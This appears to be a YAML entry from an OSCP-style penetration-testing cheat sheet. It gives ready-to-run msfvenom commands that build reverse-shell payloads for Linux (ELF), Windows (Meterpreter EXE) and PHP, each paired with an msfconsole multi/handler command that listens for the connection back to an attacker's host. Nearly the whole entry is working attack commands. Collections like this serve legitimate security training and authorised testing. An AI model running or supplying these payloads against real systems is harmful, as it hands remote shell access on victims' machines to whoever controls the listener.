---
variants:
  - label: linux-elf
    command: |
      msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf
      msfconsole -x 'use exploit/multi/handler;set payload linux/x64/shell_reverse_tcp;set LHOST $LHOST;set LPORT $LPORT;run;'
  - label: windows-meterpreter
    command: |
      msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o reverse.exe
      msfconsole -x 'use exploit/multi/handler;set payload windows/x64/meterpreter_reverse_tcp;set LHOST $LHOST;set LPORT $LPORT;run;'
  - label: php
    command: |
      msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw > reverse.php
      msfconsole -x 'use exploit/multi/handler;set payload php/reverse_php;set LHOST $LHOST;set LPORT $LPORT;run;'
description: Generate a reverse shell payload with msfvenom and start its matching handler, by target.
os: [Linux]
category: [oscp, cli]
service: [HTTP]
phase: [Exploitation]
references:
  - https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
---
